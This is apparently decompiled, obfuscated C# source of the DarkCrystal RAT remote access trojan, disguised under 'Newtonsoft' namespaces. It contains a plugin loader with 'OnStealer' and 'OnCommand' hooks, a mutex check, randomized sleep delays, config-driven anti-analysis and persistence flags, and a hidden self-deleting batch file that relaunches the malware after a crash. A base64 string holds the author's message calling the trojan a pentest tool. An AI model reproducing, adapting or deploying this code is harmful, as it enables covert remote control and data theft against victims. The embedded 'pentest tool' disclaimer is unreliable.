using GDBD.Importers;
using GDBD.Mappers;
using GDBD.Maps;
using GDBD.Specifications;
using GDBD.Structs;
using GDBD.Workers;
using Newtonsoft.Common;
using Newtonsoft.Database;
using Newtonsoft.Expressions;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Newtonsoft.Annotations
{
	internal static class MappingListAnnotation
	{
		[CompilerGenerated]
		private sealed class _0001
		{
			public Type _0001;

			[MethodImpl(MethodImplOptions.NoInlining)]
			public _0001()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				base._002Ector();
			}
		}

		[CompilerGenerated]
		private sealed class _0002
		{
			public MethodInfo _0001;

			public _0001 _0002;

			[MethodImpl(MethodImplOptions.NoInlining)]
			public _0002()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				base._002Ector();
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0001()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				switch (this._0001.GetParameters().Length)
				{
				case 0:
					this._0001.Invoke(_0002._0001.Assembly.CreateInstance(_0002._0001.Name), null);
					break;
				case 1:
					this._0001.Invoke(_0002._0001.Assembly.CreateInstance(_0002._0001.Name), new object[1]
					{
						m_CandidateEvent
					});
					break;
				case 2:
					this._0001.Invoke(_0002._0001.Assembly.CreateInstance(_0002._0001.Name), new object[2]
					{
						m_CandidateEvent,
						m_TokenizerEvent
					});
					break;
				case 3:
					this._0001.Invoke(_0002._0001.Assembly.CreateInstance(_0002._0001.Name), new object[3]
					{
						m_CandidateEvent,
						m_TokenizerEvent,
						m_PolicyEvent
					});
					break;
				}
			}
		}

		[Serializable]
		[CompilerGenerated]
		private sealed class RulesContainerComp
		{
			public static readonly RulesContainerComp m_AdapterComposer;

			public static ThreadStart _ListenerComposer;

			[MethodImpl(MethodImplOptions.NoInlining)]
			static RulesContainerComp()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				m_AdapterComposer = new RulesContainerComp();
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			public RulesContainerComp()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				base._002Ector();
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0001()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				Type[] types = Assembly.GetExecutingAssembly().GetTypes();
				for (int i = 0; i < types.Length; i++)
				{
					_0001 obj = new _0001
					{
						_0001 = types[i]
					};
					if (!obj._0001.Name.Contains("DPlugin"))
					{
						continue;
					}
					MethodInfo[] methods = obj._0001.GetMethods();
					for (int j = 0; j < methods.Length; j++)
					{
						_0002 CS_0024_003C_003E8__locals0 = new _0002
						{
							_0002 = obj,
							_0001 = methods[j]
						};
						switch (CS_0024_003C_003E8__locals0._0001.Name)
						{
						case "OnLoad":
							try
							{
								new Thread((ThreadStart)delegate
								{
									//Discarded unreachable code: IL_0002
									//IL_0003: Incompatible stack heights: 0 vs 1
									switch (CS_0024_003C_003E8__locals0._0001.GetParameters().Length)
									{
									case 0:
										CS_0024_003C_003E8__locals0._0001.Invoke(CS_0024_003C_003E8__locals0._0002._0001.Assembly.CreateInstance(CS_0024_003C_003E8__locals0._0002._0001.Name), null);
										break;
									case 1:
										CS_0024_003C_003E8__locals0._0001.Invoke(CS_0024_003C_003E8__locals0._0002._0001.Assembly.CreateInstance(CS_0024_003C_003E8__locals0._0002._0001.Name), new object[1]
										{
											m_CandidateEvent
										});
										break;
									case 2:
										CS_0024_003C_003E8__locals0._0001.Invoke(CS_0024_003C_003E8__locals0._0002._0001.Assembly.CreateInstance(CS_0024_003C_003E8__locals0._0002._0001.Name), new object[2]
										{
											m_CandidateEvent,
											m_TokenizerEvent
										});
										break;
									case 3:
										CS_0024_003C_003E8__locals0._0001.Invoke(CS_0024_003C_003E8__locals0._0002._0001.Assembly.CreateInstance(CS_0024_003C_003E8__locals0._0002._0001.Name), new object[3]
										{
											m_CandidateEvent,
											m_TokenizerEvent,
											m_PolicyEvent
										});
										break;
									}
								}).Start();
							}
							catch
							{
							}
							break;
						case "OnCommand":
							try
							{
								DecoratorEventEntry.list.Add(CS_0024_003C_003E8__locals0._0002._0001.GetField("CommandName", BindingFlags.Static | BindingFlags.Public).GetValue(CS_0024_003C_003E8__locals0._0002._0001.Assembly.CreateInstance("CommandName")).ToString(), new object[2]
								{
									CS_0024_003C_003E8__locals0._0001,
									CS_0024_003C_003E8__locals0._0002._0001.Assembly.CreateInstance(CS_0024_003C_003E8__locals0._0002._0001.Name)
								});
							}
							catch
							{
							}
							break;
						case "OnUninstall":
							try
							{
								DecoratorEventEntry.instance.Add(new object[2]
								{
									CS_0024_003C_003E8__locals0._0001,
									CS_0024_003C_003E8__locals0._0002._0001.Assembly.CreateInstance(CS_0024_003C_003E8__locals0._0002._0001.Name)
								});
							}
							catch
							{
							}
							break;
						case "OnStealer":
							try
							{
								DecoratorEventEntry.dic.Add(new object[2]
								{
									CS_0024_003C_003E8__locals0._0001,
									CS_0024_003C_003E8__locals0._0002._0001.Assembly.CreateInstance(CS_0024_003C_003E8__locals0._0002._0001.Name)
								});
							}
							catch
							{
							}
							break;
						}
					}
				}
			}
		}

		public static string m_PolicyEvent = Assembly.GetExecutingAssembly().Location;

		public static string m_ServiceEvent = "";

		public static bool queueEvent = false;

		public static string _ProxyEvent = ClassEvent.ResetFilter(GlobalIssuerImporter._0001() + GlobalIssuerImporter.SetList() + GlobalIssuerImporter.RemoveList());

		public static string _RegistryEvent = "3.0.9";

		public static string _AttrEvent = "SGVsbG8gS2VyYmVyb3MgNDc2OCAoMHg2KSwgSmFtZXNfaW50aGVfYm94IGFuZCBvdGhlciBraWRzISBHb29kIGpvYi4gQWJvdXQgbWU6IEknbSBmcm9tIFVrcmFpbmUsIEtpZXYsIG15IG5hbWUgaXMgQW5kcmVpLiBDb250YWN0IG1lLCBhbmQgaG93IHlvdSBkbyBpdCBpcyB1cCB0byB5b3UuIERhcmtDcnlzdGFsIFJBVChEQ1JhdCkgbm90IGEgdmlydXMsIGl0J3MgcGVudGVzdCB0b29sLiBEQ1JhdCBpcyB1c2VkIGluIGJhbmtzIGFuZCBvdGhlciBvcmdhbml6YXRpb25zLiBJIGRvbid0IGhhdmUgYSBnb2FsIHRvIHNwcmVhZCBpdCBhbGwgb3ZlciB0aGUgSW50ZXJuZXQuIFRoZSB1c2VyIGFncmVlbWVudCBpbmRpY2F0ZXMgaWxsZWdhbCBhY3Rpb25zIG9uIHRoZSBwYXJ0IG9mIHVzZXJzLCBhbGwgcmVzcG9uc2liaWxpdHkgbGllcyB3aXRoIHRoZW0uIFRoZXJlIGlzIG5vIG5lZWQgdG8gZGlzYXNzZW1ibGUgdGhlIHByb2dyYW0u";

		public static int m_ConfigurationEvent = 0;

		public static string m_CandidateEvent;

		public static string m_TokenizerEvent;

		[MethodImpl(MethodImplOptions.NoInlining)]
		[STAThread]
		private static void PrintFilter()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(defaultValue: false);
			SingletonReader.PushGlobal();
			AppDomain.CurrentDomain.UnhandledException += CountFilter;
			if (m_PolicyEvent.Length < 6 || !m_PolicyEvent.Contains(".exe"))
			{
				m_PolicyEvent = Application.ExecutablePath;
			}
			if (m_ServiceEvent == "")
			{
				queueEvent = true;
				Type[] types = Assembly.GetExecutingAssembly().GetTypes();
				foreach (Type type in types)
				{
					if (!type.Name.Contains("BuildConfiguration"))
					{
						continue;
					}
					MethodInfo[] methods = type.GetMethods();
					foreach (MethodInfo methodInfo in methods)
					{
						if (methodInfo.Name == "GetConfiguration")
						{
							m_ServiceEvent = methodInfo.Invoke(type.Assembly.CreateInstance(type.Name), null).ToString();
						}
					}
				}
			}
			m_ServiceEvent = ClassEvent.ComputeFilter(m_ServiceEvent);
			Thread.Sleep(new RepositoryEvent().PopList(5000, 10000));
			if (!ReponseClassSpec.LoginList(ClassEvent.ResetFilter(DecoratorReaderMapper.PatchRequest(m_ServiceEvent)["MUTEX"].ResetClass<string>())))
			{
				Environment.Exit(0);
				Application.Exit();
			}
			try
			{
				if (!DecoratorReaderMapper.PatchRequest(m_ServiceEvent)["AD"].ResetClass<bool>())
				{
					MapperEvent.InvokeFilter();
				}
			}
			catch
			{
			}
			string[] array = DispatcherInstanceExpression.AssetFilter(DecoratorReaderMapper.PatchRequest(m_ServiceEvent)["H1"].ResetClass<string>(), DecoratorReaderMapper.PatchRequest(m_ServiceEvent)["H2"].ResetClass<string>());
			m_CandidateEvent = array[0];
			m_TokenizerEvent = array[1];
			if (m_TokenizerEvent == null)
			{
				Environment.FailFast("Z6zQubie8vkgP6dfdXQcc1A");
			}
			try
			{
				new Thread((ThreadStart)delegate
				{
					//Discarded unreachable code: IL_0002
					//IL_0003: Incompatible stack heights: 0 vs 1
					Type[] types2 = Assembly.GetExecutingAssembly().GetTypes();
					Type type2 = default(Type);
					MethodInfo methodInfo2 = default(MethodInfo);
					for (int k = 0; k < types2.Length; k++)
					{
						type2 = types2[k];
						if (type2.Name.Contains("DPlugin"))
						{
							MethodInfo[] methods2 = type2.GetMethods();
							for (int l = 0; l < methods2.Length; l++)
							{
								methodInfo2 = methods2[l];
								switch (methodInfo2.Name)
								{
								case "OnLoad":
									try
									{
										new Thread((ThreadStart)delegate
										{
											//Discarded unreachable code: IL_0002
											//IL_0003: Incompatible stack heights: 0 vs 1
											switch (methodInfo2.GetParameters().Length)
											{
											case 0:
												methodInfo2.Invoke(type2.Assembly.CreateInstance(type2.Name), null);
												break;
											case 1:
												methodInfo2.Invoke(type2.Assembly.CreateInstance(type2.Name), new object[1]
												{
													m_CandidateEvent
												});
												break;
											case 2:
												methodInfo2.Invoke(type2.Assembly.CreateInstance(type2.Name), new object[2]
												{
													m_CandidateEvent,
													m_TokenizerEvent
												});
												break;
											case 3:
												methodInfo2.Invoke(type2.Assembly.CreateInstance(type2.Name), new object[3]
												{
													m_CandidateEvent,
													m_TokenizerEvent,
													m_PolicyEvent
												});
												break;
											}
										}).Start();
									}
									catch
									{
									}
									break;
								case "OnCommand":
									try
									{
										DecoratorEventEntry.list.Add(type2.GetField("CommandName", BindingFlags.Static | BindingFlags.Public).GetValue(type2.Assembly.CreateInstance("CommandName")).ToString(), new object[2]
										{
											methodInfo2,
											type2.Assembly.CreateInstance(type2.Name)
										});
									}
									catch
									{
									}
									break;
								case "OnUninstall":
									try
									{
										DecoratorEventEntry.instance.Add(new object[2]
										{
											methodInfo2,
											type2.Assembly.CreateInstance(type2.Name)
										});
									}
									catch
									{
									}
									break;
								case "OnStealer":
									try
									{
										DecoratorEventEntry.dic.Add(new object[2]
										{
											methodInfo2,
											type2.Assembly.CreateInstance(type2.Name)
										});
									}
									catch
									{
									}
									break;
								}
							}
						}
					}
				}).Start();
			}
			catch
			{
			}
			if (DecoratorReaderMapper.PatchRequest(m_ServiceEvent)["AS"].ResetClass<bool>())
			{
				OrderIteratorMapping.DisableRecord();
			}
			if (DecoratorReaderMapper.PatchRequest(m_ServiceEvent)["AK"].ResetClass<bool>())
			{
				OrderIteratorMapping.VerifyRecord();
			}
			DispatcherInstanceExpression.CallFilter(m_CandidateEvent, m_TokenizerEvent);
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		private static void CountFilter(object setup, UnhandledExceptionEventArgs pol)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			string text = Path.GetDirectoryName(m_PolicyEvent) + "\\" + "bPBfVfmmnP" + ".bat";
			string contents = "@echo off\r\nchcp 65001\r\nping -n 10 localhost > nul\r\ncd \"" + Path.GetDirectoryName(m_PolicyEvent) + "\"\r\nstart \"\" \"" + m_PolicyEvent + "\"\r\ndel /a /q /f \"" + text + "\"";
			File.WriteAllText(text, contents, new UTF8Encoding(encoderShouldEmitUTF8Identifier: false));
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				FileName = text
			};
			Process.Start(startInfo);
			Environment.Exit(0);
			Application.Exit();
		}
	}
}
